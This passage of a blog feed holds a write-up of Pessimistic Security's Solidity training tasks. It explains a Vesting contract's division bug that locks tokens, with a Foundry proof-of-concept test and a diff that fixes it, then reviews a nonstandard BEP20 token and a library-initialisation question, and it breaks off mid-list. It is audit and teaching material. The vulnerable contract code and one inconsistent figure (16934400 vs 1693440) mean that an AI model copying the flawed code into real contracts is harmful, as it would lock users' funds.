&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blog.pessimistic.io&#x2F;amm-automatic-market-makers-integration-tips-e42fe275e13c?source=collection_home---4------4-----------------------&quot; target=_blank&gt;AMM Integration tips by @officer_cia&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;docs.uniswap.org&#x2F;concepts&#x2F;uniswap-protocol&quot; target=_blank&gt;Uniswap Docs&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;mirror.xyz&#x2F;0x0cf5C6d3c1122504091EAd6a3Dc5BD31f7BbeDE3&quot; taget=_blank&gt;A Great Anon&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;coinmonks&#x2F;uniswap-introduction-2-c60e66530e68&quot; taget=_blank&gt;An Eilte Anon&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;casweeney&#x2F;Uniswap-ALL-IN-ONE&quot; target=_blank&gt;Great examples by a Ultimate guy&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Pessimistic Tasks</title>
        <published>2023-12-30T00:00:00+00:00</published>
        <updated>2023-12-30T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/pessimist-tasks/"/>
        <id>https://themj0ln1r.github.io/writeups/pessimist-tasks/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/pessimist-tasks/">&lt;p&gt;Hello all, I found some cool solidity security tasks created by &lt;a href=&quot;https:&#x2F;&#x2F;pessimistic.io&#x2F;&quot; target=_blank&gt;Pessimistic Security&lt;&#x2F;a&gt; contributed by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;korepkorep&quot; target=_blank&gt;@korepkorep&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;PavelCore&quot; target=_blank&gt;@PavelCore&lt;&#x2F;a&gt;. These challenges looks interesting to me, I solved all of them and you can find my solutions to them below.&lt;&#x2F;p&gt;
&lt;p&gt;Pessimistic Security Tasks Repo : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;pessimistic-io&#x2F;internship-tasks&quot; target=_blank&gt;Tasks&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;My solution Repo : &lt;a href=&quot;&quot; target=_blank&gt;Will Push Soon&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;vesting&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vesting&quot; aria-label=&quot;Anchor link for: vesting&quot;&gt;Vesting&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description&quot; aria-label=&quot;Anchor link for: description&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Vesting contract implements a Token Vesting Pattern. Token Vesting is the process in which purchased tokens are locked and released slowly over time. Particularly this Vesting contract follows the &lt;code&gt;cliff vesting&lt;&#x2F;code&gt;. Which means the tokens will be locked for the cliff duration and after cliff duration the tokens will be released linearly. The Vesting contracts initializes the &lt;code&gt;token&lt;&#x2F;code&gt;, &lt;code&gt;cliffMonthDuration&lt;&#x2F;code&gt;, &lt;code&gt;vestingMonthDuration&lt;&#x2F;code&gt;, accounts and amounts to be locked. To release tokens &lt;code&gt;release()&lt;&#x2F;code&gt; is called. The tokens will only be released after the cliff duration has been passed. If the cliff duration passed the &lt;code&gt;amountByMonth&lt;&#x2F;code&gt; is calculated and the &lt;code&gt;releaseAmount&lt;&#x2F;code&gt; is calculated for the total months from the star time. The released amount will be transfered to the caller of &lt;code&gt;release()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;vulnerabilities&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerabilities&quot; aria-label=&quot;Anchor link for: vulnerabilities&quot;&gt;Vulnerabilities&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;The main vulnerability is that the tokens sent to the Vesting contract are locked forever. This is because the incorrect calculation of the &lt;code&gt;amountByMonth&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;uint256 amountByMonth = vestingInfo.locked &#x2F; (vestingDuration + cliffDuration);&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Lets say, the &lt;code&gt;cliffMonthDuration = 2&lt;&#x2F;code&gt; and &lt;code&gt;vestingMonthDuration = 5&lt;&#x2F;code&gt; and tokens sent are 1000.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;vestingDuration + cliffDuration = (2 * 4 weeks) + (5 * 4 weeks)&lt;&#x2F;code&gt; = 16934400&lt;&#x2F;p&gt;
&lt;p&gt;amountByMonth = 1000 &#x2F; 1693440, This result 0 in solidity. So, our tokens wont be released unless the total tokens sent are greater than 1693440. That too, we will get very less amount for each month.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;attack-poc&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#attack-poc&quot; aria-label=&quot;Anchor link for: attack-poc&quot;&gt;Attack POC&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;POC to catch the vulnerability :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;    &#x2F;&#x2F; Before modification
&lt;&#x2F;span&gt;&lt;span&gt;    function test_vesting() public{
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Address(1) : &amp;quot;, token.balanceOf(address(1)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Vesting : &amp;quot;, token.balanceOf(address(vest)));
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startPrank(address(1));
&lt;&#x2F;span&gt;&lt;span&gt;        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.expectRevert();
&lt;&#x2F;span&gt;&lt;span&gt;        vest.release();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopPrank();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Address(1) : &amp;quot;, token.balanceOf(address(1)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Vesting : &amp;quot;, token.balanceOf(address(vest)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;recommendation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#recommendation&quot; aria-label=&quot;Anchor link for: recommendation&quot;&gt;Recommendation&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;To fix the bug, we need to calculate the amountByMonth by dividing the &lt;code&gt;(vestingDuration + cliffDuration)&lt;&#x2F;code&gt; by &lt;code&gt;4 weeks&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;uint256 amountByMonth = vestingInfo.locked &#x2F; ((vestingDuration + cliffDuration) &#x2F; 4 weeks );&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;What this does is, it ensures to calculate the amout for one month, instead of calculating for the huge number of seconds.&lt;&#x2F;p&gt;
&lt;p&gt;Corrected Code :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;diff&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-diff &quot;&gt;&lt;code class=&quot;language-diff&quot; data-lang=&quot;diff&quot;&gt;&lt;span&gt;&#x2F;&#x2F; This code snippet is provided by Pessimistic company.
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; To apply for the internship opportunity at Pessimistic company,
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; please fill out the form by visiting the following link: https:&#x2F;&#x2F;forms.gle&#x2F;SUTcGi8X86yNoFnG7
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Caution: This code is intended for educational purposes only
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; and should not be used in production environments.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.14;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;utils&#x2F;SafeERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Vesting {
&lt;&#x2F;span&gt;&lt;span&gt;    event TokenReleased(
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed account,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed token,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct Info {
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 locked;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 released;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    address public immutable token;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public immutable startTimestamp;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 internal cliffDuration;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 internal vestingDuration;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; Info) internal _vesting;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;**
&lt;&#x2F;span&gt;&lt;span&gt;     * @notice constructor
&lt;&#x2F;span&gt;&lt;span&gt;     * @param token_ - token address
&lt;&#x2F;span&gt;&lt;span&gt;     * @param cliffMonthDuration - cliff duration in months
&lt;&#x2F;span&gt;&lt;span&gt;     * @param vestingMonthDuration - vesting duration in months
&lt;&#x2F;span&gt;&lt;span&gt;     * @param accounts - vesting accounts
&lt;&#x2F;span&gt;&lt;span&gt;     * @param amounts - vesting amounts of accounts
&lt;&#x2F;span&gt;&lt;span&gt;     **&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(
&lt;&#x2F;span&gt;&lt;span&gt;        address token_,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 cliffMonthDuration,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 vestingMonthDuration,
&lt;&#x2F;span&gt;&lt;span&gt;        address[] memory accounts,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] memory amounts
&lt;&#x2F;span&gt;&lt;span&gt;    ) {
&lt;&#x2F;span&gt;&lt;span&gt;        startTimestamp = uint64(block.timestamp);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token = token_;
&lt;&#x2F;span&gt;&lt;span&gt;        cliffDuration = cliffMonthDuration * 4 weeks;
&lt;&#x2F;span&gt;&lt;span&gt;        vestingDuration = vestingMonthDuration * 4 weeks;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for (uint256 i = 0; i &amp;lt; accounts.length; i++) {
&lt;&#x2F;span&gt;&lt;span&gt;            _vesting[accounts[i]] = Info({locked: amounts[i], released: 0});
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function release() external {
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F;add history by block
&lt;&#x2F;span&gt;&lt;span&gt;        address sender = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            block.timestamp &amp;gt; startTimestamp + cliffDuration,
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;cliff period has not ended yet.&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Info storage vestingInfo = _vesting[sender];
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;-       uint256 amountByMonth = vestingInfo.locked &#x2F; (vestingDuration + cliffDuration);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;+       uint256 amountByMonth = vestingInfo.locked &#x2F; ((vestingDuration + cliffDuration)&#x2F; 4 weeks);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 releaseAmount = ((block.timestamp - startTimestamp) &#x2F; 4 weeks) *
&lt;&#x2F;span&gt;&lt;span&gt;            amountByMonth -
&lt;&#x2F;span&gt;&lt;span&gt;            vestingInfo.released;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(releaseAmount &amp;gt; 0, &amp;quot;not enough release amount.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vestingInfo.released += releaseAmount;
&lt;&#x2F;span&gt;&lt;span&gt;        SafeERC20.safeTransfer(IERC20(token), sender, releaseAmount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;POC To ensure secure code :&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;    &#x2F;&#x2F; After fixing bug
&lt;&#x2F;span&gt;&lt;span&gt;    function test_vestingFixed() public{
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Address(1) : &amp;quot;, token.balanceOf(address(1)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Vesting : &amp;quot;, token.balanceOf(address(vest)));
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startPrank(address(1));
&lt;&#x2F;span&gt;&lt;span&gt;        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vest.release();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopPrank();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Address(1) : &amp;quot;, token.balanceOf(address(1)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Balance of Vesting : &amp;quot;, token.balanceOf(address(vest)));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;vulnerable-bep20&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#vulnerable-bep20&quot; aria-label=&quot;Anchor link for: vulnerable-bep20&quot;&gt;Vulnerable BEP20&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-1&quot; aria-label=&quot;Anchor link for: description-1&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;BEP20 basically refers to a token standard used for creating tokens on Binance Smart Chain, just like ERC20 for creating tokens on Ethereum.
BEP20 have many similarities with the ERC20 token standard. To interact with the BSC blockchain, a token based on the BEP-20 standard, BNB, is required to pay for transactions, just like Ether is used to pay for gas fees in the Ethereum blockchain. In fact, the BEP-20 standard is an extension of the ERC‚Äì20 standard on Ethereum.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;observations&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#observations&quot; aria-label=&quot;Anchor link for: observations&quot;&gt;Observations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;BEP20.sol file consists of a &lt;code&gt;IBEP20&lt;&#x2F;code&gt; interface, &lt;code&gt;Context&lt;&#x2F;code&gt; contract, &lt;code&gt;SafeMath&lt;&#x2F;code&gt; library, &lt;code&gt;Ownable&lt;&#x2F;code&gt; contract, &lt;code&gt;BEP20Token&lt;&#x2F;code&gt; contract. &lt;code&gt;BEP20Token&lt;&#x2F;code&gt; contract inherits the all the contracts and interface.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;It has two mappings &lt;code&gt;_balances&lt;&#x2F;code&gt; and &lt;code&gt;_allowances&lt;&#x2F;code&gt; similar to ERC20&lt;&#x2F;li&gt;
&lt;li&gt;BEP20 token has the &lt;code&gt;name&lt;&#x2F;code&gt;, &lt;code&gt;symbol&lt;&#x2F;code&gt;, &lt;code&gt;totalSupply&lt;&#x2F;code&gt;, &lt;code&gt;decimals&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The totalSupply is &lt;code&gt;1000000000000000 * 1e18&lt;&#x2F;code&gt; will be minted to the contract deployer.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;balanceOf()&lt;&#x2F;code&gt; and &lt;code&gt;allowance()&lt;&#x2F;code&gt; returns the balances, allowances respectively.&lt;&#x2F;li&gt;
&lt;li&gt;It has &lt;code&gt;approve()&lt;&#x2F;code&gt; and &lt;code&gt;transferFrom()&lt;&#x2F;code&gt; functions similar to ERC20.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;increaseAllowances()&lt;&#x2F;code&gt; and &lt;code&gt;decreaseAllowances()&lt;&#x2F;code&gt; were used to change the allowances securely.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;mint()&lt;&#x2F;code&gt; and &lt;code&gt;burn()&lt;&#x2F;code&gt; functions were implemented.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;burnFrom()&lt;&#x2F;code&gt; function is appeared which is not in ERC20&lt;&#x2F;li&gt;
&lt;li&gt;In &lt;code&gt;Ownable&lt;&#x2F;code&gt; contract CEI are not followed. Events were emitted before effects.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;differences-from-standard-bep20&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#differences-from-standard-bep20&quot; aria-label=&quot;Anchor link for: differences-from-standard-bep20&quot;&gt;Differences from Standard BEP20&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Transfer&lt;&#x2F;code&gt; event was not emitted inside the constructor, were the deployer gets the totalSupply amount of tokens.&lt;&#x2F;li&gt;
&lt;li&gt;No &lt;code&gt;getOwner()&lt;&#x2F;code&gt; function is implemented. Which is necessary as per the standard.&lt;&#x2F;li&gt;
&lt;li&gt;Burning a token emits an event &lt;code&gt;Burn()&lt;&#x2F;code&gt;. Which is not the standard event.&lt;&#x2F;li&gt;
&lt;li&gt;After burning a token, the &lt;code&gt;_burn()&lt;&#x2F;code&gt; should emit an event &lt;code&gt;Transfer(account, address(0), amount);&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;burnFrom()&lt;&#x2F;code&gt; function is defined. Which not necessary and not mentioned in standard.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h2 id=&quot;recommendations&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#recommendations&quot; aria-label=&quot;Anchor link for: recommendations&quot;&gt;Recommendations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;Implement &lt;code&gt;getOwner()&lt;&#x2F;code&gt; function which is necessary as per standard.&lt;&#x2F;li&gt;
&lt;li&gt;Remove &lt;code&gt;Burn&lt;&#x2F;code&gt; event, replace this with &lt;code&gt;Transfer&lt;&#x2F;code&gt; event.&lt;&#x2F;li&gt;
&lt;li&gt;Use &lt;code&gt;mint()&lt;&#x2F;code&gt; function instead of direct update of balance of owner inside constructor.&lt;&#x2F;li&gt;
&lt;li&gt;Use &lt;code&gt;increaseAllowances()&lt;&#x2F;code&gt; and &lt;code&gt;decreaseAllowances()&lt;&#x2F;code&gt; to change allowances instead of &lt;code&gt;approve()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;h1 id=&quot;libraries&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#libraries&quot; aria-label=&quot;Anchor link for: libraries&quot;&gt;Libraries&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;description-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#description-2&quot; aria-label=&quot;Anchor link for: description-2&quot;&gt;Description&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;A library in Solidity is a different type of smart contract that contains reusable code. Once deployed on the blockchain (only once), it is assigned a specific address and its properties &#x2F; methods can be reused many times by other contracts in the Ethereum network.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;observations-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#observations-1&quot; aria-label=&quot;Anchor link for: observations-1&quot;&gt;Observations&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;The CountersUpgradeable and EnumerableSetUpgradeable are removed by the OpenZeppelin, they are no more accessible.&lt;&#x2F;li&gt;
&lt;li&gt;We can use a storage variable as counter instead of CountersUpgradeable contract, because the arithmetic checks were done by the solidity compiler 0.8.x&lt;&#x2F;li&gt;
&lt;li&gt;I have manually added these two contracts to keep the challenge as it is.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;Libraries.sol&lt;&#x2F;code&gt; consists of two library contracts &lt;code&gt;Items&lt;&#x2F;code&gt; and &lt;code&gt;Placements&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;Items&lt;&#x2F;code&gt; library have two structs &lt;code&gt;ItemId&lt;&#x2F;code&gt; and &lt;code&gt;Item&lt;&#x2F;code&gt;. The &lt;code&gt;Items&lt;&#x2F;code&gt; library functions can be called on &lt;code&gt;ItemId&lt;&#x2F;code&gt; struct. (using Items for ItemId).&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;Placement&lt;&#x2F;code&gt; library have two structs &lt;code&gt;Placements&lt;&#x2F;code&gt; and &lt;code&gt;Registry&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;CountersUpgradeable functions can be called on &lt;code&gt;CountersUpgradeable.Counter&lt;&#x2F;code&gt; and Items functions can be calleable on &lt;code&gt;Items.Item&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;An abstract contract &lt;code&gt;ManageStorage&lt;&#x2F;code&gt; also defined.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;questions&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#questions&quot; aria-label=&quot;Anchor link for: questions&quot;&gt;Questions&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;How is the _placementRegistry from the ManagerStorage contract initialized? (Write a mini-contract with 3 variants of initialization. For instance, you can design it as 3 functions).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;_placementRegistry&lt;&#x2F;code&gt; is an instance of struct &lt;code&gt;Placements.Registry&lt;&#x2F;code&gt;. That is the &lt;code&gt;Registry&lt;&#x2F;code&gt; struct inside &lt;code&gt;Placements&lt;&#x2F;code&gt; library.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;placementRegisrty&lt;&#x2F;code&gt; is not initialized inside ManagerStorage.&lt;&#x2F;li&gt;
&lt;li&gt;Structs with nested mappings can&#x27;t be directly constructed. i.e, we cannot use &lt;code&gt;Placements.Registry({})&lt;&#x2F;code&gt; initialization method.&lt;&#x2F;li&gt;
&lt;li&gt;This is because since version 0.7.0, structs or arrays that contain a mapping can only be used in storage, so Solidity complains because variables in an instantiation function would be in memory by default.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;contract Manager is ManagerStorage{
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(){
&lt;&#x2F;span&gt;&lt;span&gt;        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function initialize() public {
&lt;&#x2F;span&gt;&lt;span&gt;        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function initializeX(Placements.Placement memory placement) public {
&lt;&#x2F;span&gt;&lt;span&gt;        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
&lt;&#x2F;span&gt;&lt;span&gt;        uint placementId = Placements.register(_placementRegistry, placement);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Are the items at line 73 in the Placements contract added correctly? Why? (Give a detailed explanation).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The items were added to &lt;code&gt;placementRecord&lt;&#x2F;code&gt; items correctly. But the &lt;code&gt;placementId&lt;&#x2F;code&gt; in line 66 is not defined. This should the the current counter value after increment on Counter.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;diff&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-diff &quot;&gt;&lt;code class=&quot;language-diff&quot; data-lang=&quot;diff&quot;&gt;&lt;span&gt;    function register(Registry storage self, Placement memory placement) external returns (uint256 placementId) {
&lt;&#x2F;span&gt;&lt;span&gt;        self.placementIdTracker.increment();
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;+       placementId = self.placementIdTracker.current();
&lt;&#x2F;span&gt;&lt;span&gt;        Placement storage placementRecord = self.placements[placementId];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        placementRecord.sender = placement.sender;
&lt;&#x2F;span&gt;&lt;span&gt;        placementRecord.beneficiary = placement.beneficiary;
&lt;&#x2F;span&gt;&lt;span&gt;        placementRecord.deadline = placement.deadline;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        for (uint256 i = 0; i &amp;lt; placement.items.length; i++) {
&lt;&#x2F;span&gt;&lt;span&gt;            placementRecord.items.push(placement.items[i]);
&lt;&#x2F;span&gt;&lt;span&gt;            placement.items[i].deposit(placement.fee);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;placementRecord&lt;&#x2F;code&gt; is the &lt;code&gt;Placement&lt;&#x2F;code&gt; struct. i.e, &lt;code&gt;self.placements[placementId]&lt;&#x2F;code&gt; is points to the mapping inside &lt;code&gt;Registry&lt;&#x2F;code&gt; struct which gets the &lt;code&gt;Placement&lt;&#x2F;code&gt; struct from placementId.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;placementRecord&lt;&#x2F;code&gt; was updated with sender, beneficiary and deadline.&lt;&#x2F;li&gt;
&lt;li&gt;Then for loop fetches each Item struct from the array of Item structs. They will be pushed to the &lt;code&gt;placementRecord.items&lt;&#x2F;code&gt; which is an array of Item structs.&lt;&#x2F;li&gt;
&lt;li&gt;Then &lt;code&gt;deposit()&lt;&#x2F;code&gt; is called on the &lt;code&gt;placement.items[i]&lt;&#x2F;code&gt; which is a Item struct. We can see &lt;code&gt;using Items for Items.Item;&lt;&#x2F;code&gt; this enable &lt;code&gt;deposit()&lt;&#x2F;code&gt; to be called on the Item struct.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
